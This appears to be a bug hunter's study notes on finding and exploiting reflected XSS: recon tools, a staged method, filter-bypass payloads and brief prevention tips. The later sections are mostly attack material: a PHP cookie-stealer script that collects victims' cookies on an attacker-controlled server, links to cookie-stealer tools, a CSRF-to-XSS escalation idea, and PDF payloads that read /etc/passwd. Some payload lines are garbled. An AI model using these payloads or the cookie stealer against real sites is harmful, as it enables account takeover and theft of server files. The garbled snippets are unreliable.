# XSS


### tools:

- gau
- autoreapeter
- logger++
- paramspider
- paramminer

- wayback url
- waymore
- WAFW00F
- kxss
- dalfox

- ffuf
- xsshunter
- xsser

### what is xss?

XSS : we can inject custom javascripts code in HTML (script template)

we have three model : DOM - Reflected - Stored

Reflected: in reflected type we are looking for any text we interred in input, show in HTML or anywhere of site 
I mean everywhere like title - the hole body - also headers - cookies and sessions

### how to find a reflected XSS?

Stage 1 → Look for holes throughout the site using tools and search for suspicious links such as [www.ex.com/contect1?=query](http://www.ex.com/contect1?=query).

Tools: gau (get all urls), ffuf, wayback urls.

Stage 2 → Test the URL you found and see which URL reflects that query in HTML.

Tools: autorepeater and logger++ burpsuite extensions.

Auto repeater setting: response.body CONTAINS "blab".

Stage 3 → When you find out which URL is reflected, it's time to set your payload.

Tools: kxss, Dalfox, xsshunter, xsser.

Stage 4 → Find out the target using any prevention or WAF.

How? Set custom characters like >, ", / and observe the site's behavior.

Tools: WAFW00F.

Stage 5 → When you find out the site's behavior, it's time to create your payload and go for the exploit.

It's better to do it manually.

### Tricks:

- Sometimes, changing the position of the query can still exploit the payload: example.com[/?](http://bugdasht.ir/?o)p=query ⇒ example.com[/?query=p](http://bugdasht.ir/?query=p)
- You can customize the headers you want: sitemap → scan → scan type = audit selected items → scan configuration → select from library.
- Auto repeater setting: response.body CONTAINS "blab".

How to prevent XSS reflected:

1. Use HTML encoding.
2. Use URL encoding.
3. Sanitize inputs.
- ** These prevention methods must be server-side; anything else can easily be bypassed.
- look content parameter: to set paylaod

### payload:

its better you fuzz with polyglots payloads.

[https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

### XSS BYPASS

- Mixed Case

```
<Script>alert(document.cookie)</Script>
```

- Unclosed Tags

```
<svg onload="alert(1)"
```

- Uppercase Payloads

```jsx
<SVG ONLOAD=ALERT(1)>
```

- Encoded XSS

```jsx
(Encoded) %3Csvg%20onload%3Dalert(1)%3E
```

- JS Lowercased Input

```
<SCRİPT>alert(1)</SCRİPT>
```

- PHP Email Validation Bypass

```
<svg/onload=alert(1)>"@gmail.com
```

- PHP URL Validation Bypass

```
javascript://%250Aalert(1)
```

- Inside Comments Bypass

```jsx
<!--><svg onload=alert(1)-->
```

### now what to do with a post based xss?

in post based xss cuz there is no such impact so you must create a way to lead a special scenario so in report give so mush higher impact

like lead a CSRF scenario to Post XSS

e.x: if you PARAM tamper and change GET to POST method and this lead the payload to XSS that post based

so there is no impact 

now what if you create a form that's lead victim send request with POST to the payload?

### Cookies Stealers

the best scenario for hijacking client cookies and leads this scenario to account take over is stealing cookie.

the simplest cookie stealer code:

```jsx
<?php
$cookie = $_GET['txt'];
$file = fopen('cookie.txt', 'a');
fwrite($file, $cookie . "\n");
fclose($file);
?>
```

[https://github.com/TheWation/PythonCookieStealer](https://github.com/TheWation/PythonCookieStealer)

[https://github.com/TheWation/NodeJsCookieStealer](https://github.com/TheWation/NodeJsCookieStealer)

You must set a payload in your personal server and give it to the target.

Example: `<script url="personal-server-ip"></script>`.



### XSS to Exfiltrate Data from PDFs

you can actually use special XSS payloads in pdf file to read or Exploit RCE on web server:

example payload

```php
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};http://x.open(‘GET’,’file:///etc/hosts’);x.send();</script><script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};http://x.open(‘GET’,’file:///etc/passwd’);x.send();</script>
```

see the burpsuite section

[Burpsuite](https://www.notion.so/Burpsuite-ff905e4d4e974bcf8ffd4e45e872801d?pvs=21)

[https://github.com/luigigubello/PayloadsAllThePDFs/tree/main](https://github.com/luigigubello/PayloadsAllThePDFs/tree/main)